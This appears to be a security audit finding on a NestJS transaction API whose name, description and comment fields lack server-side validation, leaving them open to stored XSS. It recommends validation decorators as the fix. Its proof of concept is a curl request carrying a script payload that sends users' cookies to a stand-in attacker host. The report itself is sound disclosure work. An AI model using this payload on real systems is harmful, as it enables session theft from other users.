### Title
Missing Server-Side Input Validation on `name`, `description`, and `message` Fields Allows Stored XSS and Unbounded Data Injection

---

### Summary

The backend API accepts transaction `name`, `description`, transaction group `description`, and comment `message` fields with no server-side length limits or character/content sanitization. The only validation guards exist in the Electron front-end (`ValidateRequestHandler.vue`), which can be trivially bypassed by any authenticated user sending a direct HTTP request to the API. Malicious content is persisted to the PostgreSQL database and subsequently rendered to all organization members who view the transaction list or details.

---

### Finding Description

Three backend DTOs accept free-form text fields with only `@IsString()` validation — no `@MaxLength()`, no character allowlist, and no HTML/script sanitization:

**`CreateTransactionDto`** — `name` and `description`: [1](#0-0) 

**`CreateTransactionGroupDto`** — `description`: [2](#0-1) 

**`CreateCommentDto`** — `message`: [3](#0-2) 

The front-end does enforce limits — `name` ≤ 50 chars and `description` ≤ 256 chars — but only inside the Electron renderer process: [4](#0-3) 

These checks are **client-side only**. The NestJS `ValidationPipe` is configured globally with `whitelist: true` and `transform: true`, but neither strips nor rejects oversized or script-injected strings because no `@MaxLength()` or `@Matches()` decorators are present on these fields: [5](#0-4) 

The `validateAndPrepareTransaction` service method performs cryptographic and expiry checks but passes `dto.name` and `dto.description` directly to the database entity without any content inspection: [6](#0-5) 

An authenticated attacker can POST directly to `POST /transactions` with a `name` or `description` containing `<script>alert(1)</script>` or a multi-megabyte string, bypassing all front-end guards.

---

### Impact Explanation

The injected content is stored in PostgreSQL and displayed to every organization member who views the transaction list or detail page. If the front-end renders these fields without HTML-encoding (a common omission in Vue template interpolation when `v-html` is used, or in notification emails), a stored XSS payload executes in the context of other users' sessions. Even without XSS, an unbounded `description` or `message` can cause excessive database row sizes and degrade service for all organization members.

---

### Likelihood Explanation

Any authenticated organization member with a valid JWT can send a crafted `POST /transactions` request directly to the API — no special privilege is required beyond membership. The bypass requires only a standard HTTP client (e.g., `curl`). The front-end validation provides zero server-side protection.

---

### Recommendation

Add `@MaxLength()` and, where appropriate, `@Matches()` decorators to all free-text fields in the affected DTOs. For example:

```typescript
// create-transaction.dto.ts
@IsString()
@MaxLength(50)
name: string;

@IsString()
@MaxLength(256)
description: string;
```

Apply equivalent constraints to `CreateTransactionGroupDto.description` (max 256) and `CreateCommentDto.message` (e.g., max 1000). Additionally, ensure the front-end HTML-encodes all user-supplied strings before rendering them in the DOM to prevent stored XSS regardless of backend validation.

---

### Proof of Concept

```bash
# Authenticated attacker bypasses front-end validation entirely
curl -X POST https://<api-host>/transactions \
  -H "Authorization: Bearer <valid_jwt>" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "<script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script>",
    "description": "'"$(python3 -c "print('A'*100000)")"'",
    "transactionBytes": "<valid_hex>",
    "creatorKeyId": 1,
    "signature": "<valid_hex>",
    "mirrorNetwork": "testnet"
  }'
```

The backend accepts and persists the payload. All organization members who subsequently load the transaction list receive the stored XSS payload and the oversized description, with no server-side rejection occurring at any point. [7](#0-6)
